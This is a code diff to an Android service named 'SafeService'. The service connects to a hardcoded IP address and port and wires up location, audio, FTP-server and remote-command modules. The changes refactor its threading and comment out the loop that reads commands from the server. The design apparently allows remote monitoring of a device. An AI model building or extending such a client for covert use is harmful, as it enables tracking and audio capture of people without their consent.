@@ -9,6 +9,7 @@ import android.net.NetworkInfo;
 import android.os.AsyncTask;
 import android.os.IBinder;
 import android.os.Looper;
+import android.os.Message;
 import android.provider.Settings;
 import android.util.Log;
 
@@ -30,7 +31,7 @@ public class SafeService extends Service {
     public static final int MESSAGE = 4000;
     public static final int FILE = 5000;
 
-    public static final boolean BOOL_DEBUG = false;
+    public static final boolean BOOL_DEBUG = true;
     public static final String VERSION = "0.6";
     public static final String SERVER = "92.111.66.145";
     public static final int PORT = 13000;
@@ -54,6 +55,7 @@ public class SafeService extends Service {
     private SafeHeartbeat heartbeat;
     private static Socket socket;
     private DataInputStream in;
+
     private DataOutputStream out;
     private static SafeLocations locs;
     private static SafeCommunications comms;
@@ -79,28 +81,12 @@ public class SafeService extends Service {
         // Check if the Service is already started
         if (!bServiceStarted) {
             bServiceStarted = true;
-            new AsyncTask<Void,Void,Void>(){
+            new Thread(){
                 @Override
-                protected void onPreExecute() {
-                    super.onPreExecute();
-                }
-
-                @Override
-                protected void onPostExecute(Void aVoid) {
-                    super.onPostExecute(aVoid);
-                }
-
-                @Override
-                protected void onProgressUpdate(Void... values) {
-                    super.onProgressUpdate(values);
-                }
-
-                @Override
-                protected Void doInBackground(Void... voids) {
+                public void run() {
                     connect();
-                    return null;
                 }
-            }.execute();
+            }.start();
         } else {
             logger.write("Service already started " + bServiceStarted);
         }
@@ -111,13 +97,12 @@ public class SafeService extends Service {
     private void connect() {
         // Init objects
         logger = new SafeLogger(getApplicationContext());
-        comms = new SafeCommunications(getApplicationContext(), logger, out, simpleID); // out = null atm
-        locs = new SafeLocations(getApplicationContext(), comms, logger, simpleID);
-        audio = new SafeAudio(getApplicationContext(), comms, logger);
-        ftpServer = new SafeFTPServer(getApplicationContext(), comms, logger);
-        commands = new SafeCommands(getApplicationContext(), comms, logger, locs, audio, ftpServer, simpleID);
-        heartbeat = new SafeHeartbeat(comms, logger);
-        heartbeat.start();
+        locs = new SafeLocations(getApplicationContext(), logger, simpleID);
+        audio = new SafeAudio(getApplicationContext(), logger);
+        ftpServer = new SafeFTPServer(getApplicationContext(), logger);
+        commands = new SafeCommands(getApplicationContext(), logger, locs, audio, ftpServer, simpleID);
+        //heartbeat = new SafeHeartbeat(logger);
+        //heartbeat.start();
 
         while (true) {
             try {
@@ -154,17 +139,19 @@ public class SafeService extends Service {
                 in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
                 out = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream()));
 
-                // set the new output stream so all objects can use it accordingly
-                comms.setOut(out);
+                comms = new SafeCommunications(getApplicationContext(), logger, out, simpleID);
+                comms.start();
 
                 // shake hands!
-                comms.handShake();
+                Message msg = new Message();
+                msg.arg1 = 1;
+                comms.mHandler.sendMessage(msg);
 
                 // start heartbeat
-                heartbeat.setRunning(true);
+                // heartbeat.setRunning(true);
 
                 // receive messages from server
-                while (true) {
+                /*while (true) {
                     // type of message received
                     int header = in.readInt();
                     // size of the message
@@ -176,7 +163,7 @@ public class SafeService extends Service {
                         in.readFully(message, 0, message.length);
                         commands.messageHandler(new String(message, "UTF-8"));
                     }
-                }
+                }*/
             } catch (SocketTimeoutException e) {
                 logger.write("Connection timed out...");
             } catch (SocketException e) {
@@ -185,7 +172,7 @@ public class SafeService extends Service {
                 logger.write(Log.getStackTraceString(e));
             } finally {
                 // disconnected
-                heartbeat.setRunning(false);
+                // heartbeat.setRunning(false);
                 try {
                     if (in != null) {
                         in.close();
